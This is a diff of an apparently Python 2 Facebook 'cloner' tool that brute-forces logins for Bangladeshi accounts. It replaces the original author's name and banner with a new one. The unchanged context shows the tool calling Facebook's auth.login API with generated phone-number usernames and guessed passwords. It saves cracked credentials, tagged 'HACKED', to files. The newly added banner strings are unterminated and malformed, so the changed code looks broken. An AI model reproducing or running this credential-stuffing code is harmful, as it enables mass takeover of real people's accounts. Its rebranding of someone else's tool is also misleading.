@@ -12,8 +12,16 @@ def psb(z):
 
 os.system('clear')
 print
-print "\x1b[0;31m\n    _____      _                  _____ _    _ \n   / ____|    | |                / ____| |  | |\n  | |    _   _| |__   ___ _ __  | (___ | |__| |\n  | |   | | | | '_ \\ / _ \\ '__|  \\___ \\|  __  |\n  | |___| |_| | |_) |  __/ |     ____) | |  | |\n   \\_____\\__, |_.__/ \\___|_|    |_____/|_|  |_|\n          __/ |                                \n         |___/\n"
-print '\x1b[0;32m\t      Devoloped By : SH TASRIF \n'
+print "\x1b[0;31m\n   @@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@      @@@@@@@  @@@
+@@@@@@@@  @@@  @@@  @@@  @@@@@@@@  @@@@ @@@     @@@@@@@@  @@@
+@@!  @@@  @@!  @@!  @@@  @@!  @@@  @@!@!@@@     !@@       @@!                 !@!  @!@  !@!  !@!  @!@  !@!  @!@  !@!!@!@!     !@!       !@!
+@!@!!@!   !!@  @!@!@!@!  @!@!@!@!  @!@ !!@!     !@!       @!!
+!!@!@!    !!!  !!!@!!!!  !!!@!!!!  !@!  !!!     !!!       !!!
+!!: :!!   !!:  !!:  !!!  !!:  !!!  !!:  !!!     :!!       !!:
+:!:  !:!  :!:  :!:  !:!  :!:  !:!  :!:  !:!     :!:       :!:
+::   :::   ::  ::   :::  ::   :::   ::   ::      ::: :::  :: ::::
+::   : :  :     :   : :   :   : :  ::    :       :: :: :  : :: : :''
+print '\x1b[0;32m\t      Devoloped By : RIHAN AHMED \n'
 print '\x1b[96m\t          SH 06 DIGIT CLONER\n'
 print '\x1b[93m================================================================================================================'
 print "\x1b[0;91m\n\t    This Tool's Free By CyberSH"
@@ -68,7 +76,15 @@ def cb():
     os.system('clear')
 
 
-logo = "\x1b[0;31m\n   _____      _                  _____ _    _ \n  / ____|    | |                / ____| |  | |\n | |    _   _| |__   ___ _ __  | (___ | |__| |\n | |   | | | | '_ \\ / _ \\ '__|  \\___ \\|  __  |\n | |___| |_| | |_) |  __/ |     ____) | |  | |\n  \\_____\\__, |_.__/ \\___|_|    |_____/|_|  |_|\n         __/ |                                \n        |___/\x1b[0;32m"
+logo = "\x1b[0;31m\n @@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@      @@@@@@@  @@@
+@@@@@@@@  @@@  @@@  @@@  @@@@@@@@  @@@@ @@@     @@@@@@@@  @@@
+@@!  @@@  @@!  @@!  @@@  @@!  @@@  @@!@!@@@     !@@       @@!                 !@!  @!@  !@!  !@!  @!@  !@!  @!@  !@!!@!@!     !@!       !@!
+@!@!!@!   !!@  @!@!@!@!  @!@!@!@!  @!@ !!@!     !@!       @!!
+!!@!@!    !!!  !!!@!!!!  !!!@!!!!  !@!  !!!     !!!       !!!
+!!: :!!   !!:  !!:  !!!  !!:  !!!  !!:  !!!     :!!       !!:
+:!:  !:!  :!:  :!:  !:!  :!:  !:!  :!:  !:!     :!:       :!:
+::   :::   ::  ::   :::  ::   :::   ::   ::      ::: :::  :: ::::
+::   : :  :     :   : :   :   : :  ::    :       :: :: :  : :: : : x1b[0;32m"
 back = 0
 successful = []
 cpb = []
@@ -79,9 +95,9 @@ def menu():
     os.system('clear')
     print logo
     print ''
-    print '\x1b[0;93mAUTHOR   : SH TASRIF'
-    print '\x1b[0;94mFACEBOOK : H.CyberSH'
-    print '\x1b[0;96mGITHUB   : ShTasrif'
+    print '\x1b[0;93mAUTHOR   : RIHAN AHMED'
+    print '\x1b[0;94mFACEBOOK : Rihan Ahmed'
+    print '\x1b[0;96mGITHUB   : Rihan444'
     print ''
     print '\x1b[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
     print '\x1b[0;91m'
@@ -231,13 +247,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[SH-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[RIHAN-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[SH-CP] \x1b[1;92m' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Open After 7 Days]\n'
+                print '\x1b[1;91m[RIHAN-CP] \x1b[1;92m' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Open After 7 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
